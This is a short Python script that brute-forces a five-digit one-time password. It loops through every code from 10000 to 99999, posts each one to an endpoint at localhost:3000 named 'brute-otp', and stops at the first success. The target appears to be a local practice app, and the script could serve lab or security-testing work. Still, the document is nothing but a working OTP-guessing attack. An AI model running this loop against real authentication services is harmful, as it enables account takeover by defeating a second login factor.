import requests

url = "http://localhost:3000/brute-otp"

for i in range(10000, 100000):
    try:
        response = requests.post(url, json={"otp": str(i)})
        if response.status_code == 200:
            print(f"Successful OTP found: {i}")
            break
        response.raise_for_status()  # raises error for 4xx/5xx
        print("Status Code:", response.status_code)
        print("Response:")
        print(response.text)
    except requests.exceptions.RequestException as e:
        print("Error:", e)
